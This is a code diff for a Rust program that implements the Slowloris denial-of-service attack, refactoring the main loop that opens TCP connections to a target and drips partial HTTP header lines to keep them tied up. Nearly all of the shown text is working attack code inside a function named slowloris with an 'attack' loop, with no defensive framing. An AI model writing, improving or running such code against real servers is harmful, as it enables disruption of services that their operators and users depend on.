@@ -71,10 +71,10 @@ fn construct_header(args :&Arguments) -> String {
 
 fn slowloris(opts :AttackOptions) -> ! {
     'connection: loop {
-        match net::TcpStream::connect(opts.target) {
-            Ok(mut stream) => {
-                match stream.write_all(opts.header.as_str().as_bytes()) {
-                    Ok(_) => {
+        net::TcpStream::connect(opts.target)
+            .map(|mut stream| {
+                stream.write_all(opts.header.as_str().as_bytes())
+                    .map(|_| {
                     'attack: loop {
                         let hdr = format!("{}\r\n", opts.attack_header.as_str());
                         match stream.write_all(hdr.as_bytes()) {
@@ -82,21 +82,11 @@ fn slowloris(opts :AttackOptions) -> ! {
                                 sleep(opts.interval);
                             },
                             Err(_) => {
-                                continue 'connection;
+                                break
                             }
                         }
-                    }
-                    },
-                    Err(_) => {
-                        continue
-                    }
-                }
-            },
-            Err(_) => {
-                continue
-            }
-
-        }
+                    }})
+        });
     }
 }
 
